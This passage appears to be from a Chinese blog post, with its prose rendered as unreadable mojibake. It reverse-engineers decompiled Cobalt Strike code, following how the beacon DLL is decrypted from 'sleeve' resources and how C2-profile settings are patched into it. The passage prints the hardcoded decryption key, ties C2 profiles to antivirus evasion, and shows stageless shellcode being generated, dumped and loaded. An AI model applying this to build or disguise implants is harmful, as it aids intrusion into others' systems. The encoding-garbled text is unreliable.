keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var33<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"export Beacon stage: "</span> <span class="token operator">+</span> var5<span class="token punctuation">,</span> var33<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è¿™æ®µä»£ç  ä»resources&#x2F;beacon.x64.dll åŠ è½½ beacon.x64.dll  æˆ‘ä»¬è¿›å…¥å‡½æ•°çœ‹çœ‹</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10<span class="token operator">=</span> <span class="token class-name">SleevedResource</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//resources/beacon.x64.dll</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">readResource</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token class-name">B<span class="token punctuation">.</span>A</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">strrep</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token string">"resources/"</span><span class="token punctuation">,</span> <span class="token string">"sleeve/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">long</span> var7 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"peiqiF4ck var2: "</span> <span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§£å¯†dll</span><span class="token keyword">return</span> var6<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readResource</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"Could not find sleeved resource: "</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">" [ERROR]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_stat</span><span class="token punctuation">(</span><span class="token string">"Used internal resource: "</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> var4<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2 <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> var1<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3 <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var1<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">,</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> var4 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var14<span class="token punctuation">;</span><span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var14 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>F</span><span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">copyOfRange</span><span class="token punctuation">(</span>var14<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">MessageDigest</span><span class="token punctuation">.</span><span class="token function">isEqual</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var5<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"[Sleeve] Bad HMAC on "</span> <span class="token operator">+</span> var1<span class="token punctuation">.</span>length <span class="token operator">+</span> <span class="token string">" byte message from resource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var15<span class="token punctuation">;</span><span class="token keyword">synchronized</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var15 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">do_decrypt</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>E</span><span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">DataInputStream</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>var15<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var9 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> var9 <span class="token operator">&lt;=</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var9<span class="token punctuation">]</span><span class="token punctuation">;</span>var7<span class="token punctuation">.</span><span class="token function">readFully</span><span class="token punctuation">(</span>var10<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var10<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_error</span><span class="token punctuation">(</span><span class="token string">"[Sleeve] Impossible message length: "</span> <span class="token operator">+</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var13<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var13<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">OriginKey</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">//è§£å¯†ç§˜é’¥åœ¨ç¬¬ä¸€ç¯‡ä¸­æåˆ°è¿‡</span><span class="token class-name">SleevedResource<span class="token punctuation">.</span>Setup</span><span class="token punctuation">(</span><span class="token class-name">OriginKey</span><span class="token punctuation">)</span><span class="token punctuation">;</span>å…¶å®åŠ è½½çš„æ˜¯  sleeve<span class="token operator">/</span>beacon<span class="token punctuation">.</span>x64<span class="token punctuation">.</span>dll</code></pre><p>ä¸Šé¢ä»£ç å…¶å®å°±æ˜¯è§£å¯† ä¸‹çš„ sleeve&#x2F;beacon.x64.dll  å¹¶ä¸”è¿”å›è§£å¯†ç»“æœï¼Œæˆ‘ä»¬è®°ä½è¿™ä¸ªvar10 å°±æ˜¯ sleeve&#x2F;beacon.x64.dll  è§£å¯†åçš„dll<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241040657.png" alt="ä»£ç æˆªå›¾"><br>æˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹æˆ‘ä»¬çœ‹åˆ° </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">".http-get.uri"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var12 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">",\\s*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">ScListener</span><span class="token punctuation">(</span><span class="token class-name">Profile</span> var1<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var2<span class="token punctuation">,</span> <span class="token class-name">Map</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>options <span class="token operator">=</span> var3<span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"C2 profile is "</span><span class="token operator">+</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile <span class="token operator">=</span> var1<span class="token punctuation">.</span><span class="token function">getVariantProfile</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getVariantName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>pubkey <span class="token operator">=</span> var2<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListenerConfig</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>c2profile<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getVariantName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">string</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"profile"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ¥ä¸‹æ¥å°±ä¸è´´ä»£ç äº†æˆ‘ä»¬ç›´æ¥è´´åˆ†æå›¾äº†</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241041150.png" alt="c2profile-1"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241042340.png" alt="c2profile-2"><br>æˆ‘ä»¬çœ‹åˆ°ç›‘å¬å™¨çš„c2profile ä¸ºdefault<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241043370.png" alt="ç›‘å¬å™¨"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241043469.png" alt="c2profile-3"><br>è¿™é‡Œä½¿ç”¨çš„c2 profile ä¸ºé»˜è®¤<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241044058.png" alt="c2profile-4"><br>&#x2F;resources&#x2F;default.profile<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241045083.png" alt="é»˜è®¤é…ç½®"><br>è¯»å–c2profileé‡Œé¢çš„é…ç½®ã€‚å¯ä»¥çœ‹åˆ°è¿™é‡Œc2 profileå’Œå…æ€æ˜¯å¤šä¹ˆæ¯æ¯ç›¸å…³ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241045591.png" alt="è¯»å–c2profile-5"><br>è¯»å–åˆ°çš„c2é…ç½®æ–‡ä»¶é‡Œé¢çš„é€‰é¡¹é…ç½®åˆ°æˆ‘ä»¬çš„shellcodeé‡Œé¢ã€‚æˆ‘ä»¬ä¹‹å‰è¯´è¿‡var10å°±æ˜¯ sleeve&#x2F;beacon.x64.dll çš„å†…å®¹ var29æŠŠdllè½¬æˆå­—ç¬¦ä¸²<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241047309.png" alt="æ¨¡æ¿å­—ç¬¦"><br>åœ¨beacon.x64.dll  é‡Œé¢æ‰¾åˆ° AAAABBBBCCCCDDDDEEEEFFFF æŠŠvar27é‡Œé¢çš„ä¸œè¥¿å¡«å…¥åˆ°è¿™é‡Œ<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241047286.png" alt="å¡«å……AAABBB"><br>åŸæ¥çš„beacon.x64.dll<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241048103.png" alt="beacon.x64.dll"><br>æˆ‘ä»¬æ¥çœ‹path stagelesssbeaconPatchSleepMask.x64.dll-Two.bin æ‰¾ 41 41 41 41 42 42 42 42 43 43 43 43 44 44 44 44 45 45 45 45 46 46 46 46<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241049842.png" alt="shellcodestagelesssbeaconPatchSleepMask"><br>æˆ‘ä»¬çœ‹patchä»¥åæ›¿æ¢ AAABBBCCC<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241050551.png" alt="AAABBB"><br>stagelesPathAAABBBCCC.bin  å¡«å…… åæœç´¢ç‰¹å¾ c9 99 6f 38 68 0c ca 95 26 d2 d5 4f 83 1a 58 f4<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241051003.png" alt="æ›¿æ¢åå¯¹æ¯”æˆªå›¾"><br>2e 2f 2e 2f 2e 2c 2e 26 2e 2c 2e 2f 2e 2c 2f 95<br>ç„¶åå†ç»è¿‡  var29 &#x3D; BeaconGuardrails.applyPatch(var29, var37, var27);  å¾—åˆ°<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241051781.png" alt="applyPatchåæˆªå›¾"><br>æ¥ä¸‹æ¥åœ¨èµ°ä¸‹ä¸€ä¸ªå‡½æ•°å¦‚ä¸‹å›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241052814.png" alt="èµ°ä¸‹ä¸€ä¸ªå‡½æ•°"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">BeaconDLL</span> var1<span class="token punctuation">,</span> <span class="token class-name">AggressorClient</span> var2<span class="token punctuation">,</span> <span class="token class-name">String</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span>isForeignListener<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var1<span class="token punctuation">.</span>originalDLL<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token class-name">Stack</span> var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">usesCustomLoaderSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>customDLL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>customFileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>originalDLL<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"BEACON_RDLL_GENERATE"</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var6 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">usesCustomLoaderSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> var1<span class="token punctuation">.</span>customFileName<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var6 <span class="token operator">=</span> var1<span class="token punctuation">.</span>fileName<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">String</span> var7 <span class="token operator">=</span> <span class="token string">"Using user modified reflective DLL! DLLName="</span> <span class="token operator">+</span> var6 <span class="token operator">+</span> <span class="token string">" Arch="</span> <span class="token operator">+</span> var3<span class="token punctuation">;</span>var2<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pinfo</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> var1<span class="token punctuation">.</span>peProcessedDLL<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shellcodeè°ƒç”¨å…³é”®<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241053897.png" alt="æ‰“å°å‡½æ•°æ‰§è¡Œå…³é”®ç‚¹"><br>åœ¨æˆ‘è¿™ä¸ªä¾‹å­ã€‚æœ€åçš„shellcodeç”Ÿæˆå°±æ˜¯ </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">return</span> var1<span class="token punctuation">.</span>peProcessedDLL<span class="token punctuation">;</span></code></pre><p>è¿™ä¸ªå°±æ˜¯windows exeé‡Œé¢çš„shellcodeä¹Ÿå°±æ˜¯ beacon.x64.dll æ¨¡ç‰ˆç»„åˆ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">this</span><span class="token punctuation">.</span>stager <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">export</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var6<span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//stageless ç”Ÿæˆå‡½æ•° shellcode ç”Ÿæˆç‚¹</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span><span class="token string">"æµ‹è¯•æ˜¯å¦æ˜¯shellcodeç”Ÿæˆç‚¹.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//æ˜¯shelllcodeç›´æ¥ä¸Šçº¿æˆåŠŸ</span></code></pre><p>æˆ‘ä»¬ä»ä»£ç dumpåçš„<br>85874bab056d5e23b1e5c36b95252f37   åŸæ¥çš„stagelessbeacon.x64.dll.bin<br/><br>93d637810cb2a9b8b8cded24c5fa534a   æµ‹è¯•æ˜¯å¦æ˜¯shellcodeç”Ÿæˆç‚¹.bin <br/><br>94d8a4865853d48a5f6140f69f57f192   stagelesssbeaconPatchSleepMask.x64.dll-Two.bin <br/><br>85874bab056d5e23b1e5c36b95252f37   stagelessbeacondllåŸæ¥çš„stagelessbeacon.x64.dll-Two.bin <br/><br>2ead49a5983278e030a65881bcece3cb   stagelesPathcEnd.bin <br/><br>6219863b56ca5c7d63c680ca116d33a5   stagelesPathAAABBBCCC.bin <br/><br>93d637810cb2a9b8b8cded24c5fa534a   pepeProcessedDLL.bin <br/><br>æˆ‘ä»¬ä½¿ç”¨shellcodeåŠ è½½å™¨åŠ è½½ä¸€ä¸‹çœ‹çœ‹<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501241055732.png" alt="åŠ è½½shellcodeç›´æ¥æ‰§è¡Œ"><br>æˆ‘ä»¬ç‚¹å‡»ä¿å­˜çš„æ—¶å€™<br>src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableStageDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dialogResult</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"stageless ç‚¹å‡»ç”Ÿæˆ:"</span> <span class="token operator">+</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token 